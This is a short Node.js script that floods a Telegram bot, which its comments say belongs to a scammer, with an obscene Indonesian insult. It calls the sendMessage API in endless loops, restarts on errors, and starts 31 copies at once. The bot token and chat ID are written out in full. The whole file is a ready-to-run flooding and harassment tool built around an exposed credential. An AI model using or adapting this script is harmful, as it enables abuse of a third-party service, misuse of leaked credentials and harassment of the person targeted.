const {default: axios} = require("axios")

const teks = `NGESCAM LOE KURANG JAUH KONTOL SINI CHAT GW KLO BISA NGENTOT` //Kata kata buat scammer

const url = (`https://api.telegram.org/bot6717883399:AAEqQNYiEHnPot3ktUxhikbmW_pIdkAhkrE/sendMessage?parse_mode=markdown&chat_id=6771033460&text=${teks}`) //APITELE SCAMMER

async function sendMessage() {
    try {
        while (true) {
            await axios.get(url)
                .then((response) => {
                    if (response.status == 200) {
                        console.log(response)
                    }
                })
        }
    } catch (error) {
        console.log(`${teks} Berhasil terkirim`)
        sendMessage();
    }
}

sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();
sendMessage();